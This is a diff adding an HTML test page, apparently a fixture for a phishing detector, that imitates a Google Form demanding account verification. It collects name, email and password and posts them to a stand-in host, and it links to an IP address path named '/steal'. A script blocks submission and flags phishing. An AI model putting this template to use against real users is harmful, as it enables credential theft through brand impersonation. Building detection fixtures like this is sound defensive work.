@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Form - Account Verification</title>
+    <!-- TEST PAGE: PHISHING - External domain action + IP address link -->
+    <style>
+        body {
+            font-family: 'Google Sans', Arial, sans-serif;
+            background-color: #f8f9fa;
+            margin: 0;
+            padding: 20px;
+        }
+        .form-container {
+            max-width: 640px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.12);
+            overflow: hidden;
+        }
+        .form-header {
+            background: #4285f4;
+            color: white;
+            padding: 24px;
+        }
+        .form-title {
+            font-size: 28px;
+            font-weight: 400;
+            margin: 0 0 8px 0;
+        }
+        .form-description {
+            font-size: 14px;
+            opacity: 0.9;
+            margin: 0;
+        }
+        .form-content {
+            padding: 24px;
+        }
+        .question {
+            margin-bottom: 24px;
+        }
+        .question-title {
+            font-size: 15px;
+            font-weight: 400;
+            margin-bottom: 8px;
+            color: #202124;
+        }
+        .question-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        .submit-btn {
+            background: #4285f4;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            cursor: pointer;
+            font-weight: 500;
+        }
+        .alert-box {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            padding: 12px;
+            margin-bottom: 16px;
+            border-radius: 4px;
+            color: #856404;
+        }
+    </style>
+</head>
+<body>
+    <div class="form-container">
+        <div class="form-header">
+            <h1 class="form-title">Account Verification Required</h1>
+            <p class="form-description">Google Form - Verify your account information</p>
+        </div>
+        
+        <div class="form-content">
+            <div class="alert-box">
+                ⚠️ Your account requires verification. Please complete this form immediately.
+            </div>
+            
+            <form action="https://malicious-example.test/collect" method="POST">
+                <div class="question">
+                    <div class="question-title">Full Name</div>
+                    <input type="text" name="fullname" class="question-input" required>
+                </div>
+                
+                <div class="question">
+                    <div class="question-title">Email Address</div>
+                    <input type="email" name="email" class="question-input" required>
+                </div>
+                
+                <div class="question">
+                    <div class="question-title">Password</div>
+                    <input type="password" name="password" class="question-input" required>
+                </div>
+                
+                <button type="submit" class="submit-btn">Verify Account</button>
+            </form>
+            
+            <div style="margin-top: 16px; padding-top: 16px; border-top: 1px solid #dadce0; font-size: 12px;">
+                <p>Need help? Contact support: <a href="http://192.0.2.1/steal">http://192.0.2.1/steal</a></p>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        document.querySelector('form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            alert('⚠️ PHISHING DETECTED: External domain + IP address link');
+        });
+    </script>
+</body>
+</html>
